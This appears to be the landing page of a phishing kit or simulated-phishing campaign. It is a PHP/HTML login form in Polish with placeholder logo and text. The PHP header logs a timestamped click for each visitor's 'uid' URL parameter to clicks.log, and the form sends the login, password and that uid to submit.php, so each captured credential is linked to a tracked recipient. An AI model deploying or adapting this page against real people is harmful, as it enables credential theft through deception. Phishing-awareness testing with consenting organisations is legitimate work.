<?php
$uid = isset($_GET['uid']) ? $_GET['uid'] : 'unknown';
file_put_contents("clicks.log", date("Y-m-d H:i:s")." - CLICK - ".$uid."\n", FILE_APPEND);
?>

<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<title>Login</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: #f2f2f2;
        margin: 0;
        padding: 0;
    }
    .container {
        width: 300px;
        background: #fff;
        margin: 60px auto;
        padding: 25px;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0,0,0,0.15);
        text-align: center;
    }
    .header-image {
        width: 100%;
        margin-bottom: 20px;
    }
    .custom-text {
        font-size: 14px;
        margin-bottom: 15px;
        color: #333;
    }
    input {
        width: 100%;
        padding: 10px;
        margin-top: 10px;
        border: 1px solid #ccc;
        border-radius: 6px;
    }
    button {
        width: 100%;
        padding: 10px;
        background: #0078d4;
        color: white;
        border: none;
        border-radius: 6px;
        margin-top: 15px;
        font-size: 15px;
        cursor: pointer;
    }
</style>
</head>

<body>

<div class="container">

    <!-- Your photo goes here LOGO-->
    <img src="zbilk-logo.png" class="header-image" alt="Logo">

    <!-- Text underneath the logo -->
    <div class="custom-text">
        Text text text text text text :) 
    </div>

    <form method="POST" action="submit.php">
        <input type="hidden" name="uid" value="<?php echo htmlspecialchars($uid); ?>">

        <input type="text" name="login" placeholder="Login" required>
        <input type="password" name="password" placeholder="Password" required>

        <button type="submit">Login</button>
    </form>

</div>

</body>
</html>
